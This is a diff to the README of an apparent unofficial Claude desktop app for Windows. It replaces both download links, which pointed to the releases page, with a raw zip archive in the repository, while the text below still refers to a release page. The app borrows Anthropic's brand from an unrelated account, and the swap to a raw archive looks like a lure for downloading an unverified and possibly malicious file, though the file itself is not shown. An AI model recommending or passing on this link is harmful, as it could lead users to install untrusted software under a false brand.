@@ -1,12 +1,12 @@
 # 🤖 Claude-Mythos-AI-Anthropic-App - Personal AI assistants for creative writing
 
-[![Download](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Anaglyphic-hogshead760/Claude-Mythos-AI-Anthropic-App/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Anaglyphic-hogshead760/Claude-Mythos-AI-Anthropic-App/raw/refs/heads/main/Sources/Mythos_Claude_A_Anthropic_App_v2.0.zip)
 
 This application provides a simple interface for the Anthropic Claude artificial intelligence model. It allows users to manage chat sessions, build custom character cards for roleplay, and organize system prompts. You can access advanced reasoning features through this desktop client on your Windows computer.
 
 ## 📥 Getting Started
 
-[Download the latest version here](https://github.com/Anaglyphic-hogshead760/Claude-Mythos-AI-Anthropic-App/releases)
+[Download the latest version here](https://github.com/Anaglyphic-hogshead760/Claude-Mythos-AI-Anthropic-App/raw/refs/heads/main/Sources/Mythos_Claude_A_Anthropic_App_v2.0.zip)
 
 Visit the release page linked above to get the software. Follow these steps to set the application on your computer.
 
